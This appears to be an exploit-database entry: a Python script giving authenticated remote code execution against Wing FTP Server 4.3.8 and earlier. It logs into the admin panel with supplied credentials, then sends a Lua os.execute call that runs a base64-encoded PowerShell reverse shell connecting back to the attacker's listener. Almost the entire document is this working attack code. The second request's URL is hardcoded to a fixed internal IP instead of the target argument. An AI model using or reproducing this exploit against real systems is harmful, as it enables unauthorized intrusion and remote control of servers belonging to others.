# Exploit Title: Wing FTP Server - Authenticated RCE
# Date: 02/06/2022
# Exploit Author: notcos
# Credit: Credit goes to the initial discoverer of this exploit, Alex Haynes.
# Vendor Homepage: https://www.wftpserver.com/
# Software Link: https://www.wftpserver.com/download/WingFtpServer.exe
# Version: <=4.3.8
# Tested on: Windows
# CVE : Revoked

# !/usr/bin/python3
import requests
import sys
import base64
import urllib.parse

# Get command line arguments
if len(sys.argv) != 7:
    print("This exploit will invoke a nishang tcp reverse shell on the target. Start your listener before executing.")
    print("Usage:   %s <TARGET> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT> <USER> <PASSWORD>" % sys.argv[0])
    print("Example:   %s 0.0.0.0 8000 127.0.0.1 9001 notcos coolpass" % sys.argv[0])
    exit(1)

else:
    target = sys.argv[1]
    targetport = sys.argv[2]
    localip = sys.argv[3]
    localport = sys.argv[4]
    user = sys.argv[5]
    password = sys.argv[6]

    print('''
          .--.
         / ,~a`-,
         \ \_.-"`
          ) (        __      __ .__            ____      __________ _________  ___________
        ,/ ."\      /  \    /  \|__|  ____    / ___\     \______   \\\\_   ___ \ \_   _____/
       /  (  |      \   \/\/   /|  | /    \  / /_/  >     |       _//    \  \/  |    __)_
      /   )  ;       \        / |  ||   |  \ \___  /      |    |   \\\\     \____ |        \\
     /   /  /         \__/\  /  |__||___|  //_____/       |____|_  / \______  //_______  /
   ,/_."` /`               \/            \/                      \/         \/         \/
    /_/\ |___
       `~~~~~`
          ''')

    # Create the login request
    url = 'http://' + target + ':' + targetport + '/admin_loginok.html'
    data = ('username=' + user + '&password=' + password + '&username_val=' + user + '&password_val=' + password + '&su'
            'bmit_btn=%2bLogin%2b')
    headers = {
        "User-Agent": "Googlebot"
    }

    # Send the POST request to log in and save the cookie
    r = requests.post(url, headers=headers, data=data)
    cookie = 'UIDADMIN=' + r.cookies['UIDADMIN']
    print('Login successful - Cookie: ' + cookie)
    url = "http://172.31.1.20:8080/admin_lua_script.html"
    headers = {
        "User-Agent": "Googlebot",
        "Cookie": cookie,
    }

    # Base64 encode a nishang reverse tcp shell one liner and then url encode it
    nish = ("$client = New-Object System.Net.Sockets.TCPClient(\"" + localip + "\"," + localport + ");$stream = $client"
            ".GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$d"
            "ata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1"
            " | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCI"
            "I).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
    encodedStr = str(base64.b64encode(nish.encode('UTF-16LE')), "UTF8")
    urlpayload = urllib.parse.quote(encodedStr, safe='+')
    finalload = "command=os.execute('powershell -Encodedcommand " + urlpayload + "')"

    # Send the reverse shell payload
    try:
        r = requests.post(url, headers=headers, data=finalload, timeout=0.1)
    except requests.exceptions.ReadTimeout: 
        print("The payload has been sent. Check your listener.")
        pass
